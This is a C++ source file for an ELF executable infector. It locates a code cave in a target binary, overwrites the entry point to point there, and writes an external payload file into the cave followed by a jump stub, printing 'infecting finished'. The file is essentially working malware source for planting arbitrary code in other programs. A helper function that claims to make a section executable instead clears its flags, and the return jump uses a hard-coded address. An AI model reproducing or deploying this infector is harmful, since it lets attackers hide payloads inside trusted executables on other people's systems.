#include <elf.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <fstream>
#include <vector>
#include <arpa/inet.h>
#include <sstream>
#include "find_cave.h"


int write_eip(int fd, long addr);
long getImageBase(int fd);


int main(int argc, char **argv) {
    char mov_rax[] = {0x48, static_cast<char>(0xc7), static_cast<char>(0xc0), static_cast<char>(0x60), 0x10, 0x00, 0x00};
    char jmp_rax[] = {static_cast<char>(0xff), static_cast<char>(0xe0)};
    std::ifstream input("payload", std::ios::binary);
    std::vector<unsigned char> payload(std::istreambuf_iterator<char>(input), {});

    code_cave_t cc;
    Elf64_Ehdr ehdr;

    int fd = open(argv[1], O_RDWR);
    if (fd < 0) {
        printf("error open");
        return -1;
    }
    read(fd, &ehdr, sizeof ehdr);
    if (find_code_cave(argv[1], &cc)) {
        printf("Error\n");
        return -1;
    }
    printf("Entrypoint: %lx\n", ehdr.e_entry);
    printf("cc.start: %lx\n", cc.start);


    Elf64_Addr entryPoint = ehdr.e_entry;
    int imgBase = getImageBase(fd);
    code_cave_t codeCave = cc;




    write_eip(fd, (getImageBase(fd) + cc.start));
    lseek(fd, cc.start, SEEK_SET);

    write(fd, mov_rax, 7);
    write(fd, payload.data(), payload.size());
    write(fd, jmp_rax, 2);
    printf("infecting finished\n");
}

int write_eip(int fd, long addr)
{
    Elf64_Ehdr ehdr;
    lseek(fd, 0, SEEK_SET);
    read(fd, &ehdr, sizeof(ehdr));
    printf("OEP: %lx\n", ehdr.e_entry);

    lseek (fd, 0, SEEK_SET);
    ehdr.e_entry = addr;
    write(fd, &ehdr, sizeof(ehdr));
    perror("write");
    printf("Wrote EP: %lx\n", ehdr.e_entry);
    return 0;
}

long getImageBase(int fd) {
    Elf64_Ehdr ehdr;
    Elf64_Phdr phdr;
    lseek (fd, 0, SEEK_SET);
    read(fd, &ehdr, sizeof(ehdr));
    int numheaders = ehdr.e_phnum;
    lseek (fd, ehdr.e_phoff, SEEK_SET);
    int ret = read(fd, &phdr, sizeof(phdr));
    for(int i=0;i<numheaders; i++)
    {
        if (phdr.p_type == 1)
        {
            printf("ImageBase: %lx \n", phdr.p_vaddr);
            break;
        }
        read(fd, &phdr, sizeof(phdr));
}
    return phdr.p_vaddr;
}

int make_section_exec(int fd, int section_num)
{
    Elf64_Ehdr ehdr;
    Elf64_Shdr shdr;
    lseek (fd, 0, SEEK_SET);
    read(fd, &ehdr, sizeof(ehdr));
    int off = lseek (fd, ehdr.e_shoff + (ehdr.e_shentsize * (section_num)), SEEK_SET);
    read(fd, &shdr, sizeof(shdr));
    shdr.sh_flags = 0;
    lseek(fd, off, SEEK_SET);
    write(fd, &shdr, sizeof(shdr));
}

